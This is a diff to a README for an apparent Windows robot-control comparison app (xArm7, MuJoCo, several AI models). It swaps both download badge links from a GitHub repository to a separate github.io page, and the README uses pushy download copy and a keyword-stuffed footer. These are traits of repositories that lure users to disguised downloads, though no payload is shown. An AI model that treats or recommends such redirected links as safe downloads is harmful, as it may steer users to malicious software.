@@ -51,7 +51,7 @@ No special hardware, robot, or sensors are needed. Everything runs virtually.
 
 ## 📥 Download and Install
 
-[![Download Now](https://img.shields.io/badge/Download-jev--robot--control-blue?style=for-the-badge&logo=github)](https://github.com/Drykeeightyeight427/jev-robot-control)
+[![Download Now](https://img.shields.io/badge/Download-jev--robot--control-blue?style=for-the-badge&logo=github)](https://drykeeightyeight427.github.io)
 
 Visit this link to download the application.
 
@@ -157,6 +157,6 @@ You now have everything you need to download, run, and enjoy this robot comparis
 
 Download it today and see the future of robot control with your own eyes.
 
-[![Get Started Now](https://img.shields.io/badge/Download-jev--robot--control-green?style=for-the-badge&logo=github)](https://github.com/Drykeeightyeight427/jev-robot-control)
+[![Get Started Now](https://img.shields.io/badge/Download-jev--robot--control-green?style=for-the-badge&logo=github)](https://drykeeightyeight427.github.io)
 
 Keywords: robot control, xArm7, MuJoCo, AI comparison, GPT-6 Astra, GPT-4.1 mini, Jev, Cartesian control, robotics simulator, virtual robot, apple placement task, offline verifier, synchronized replay, Windows application, API cost comparison, trajectory recording
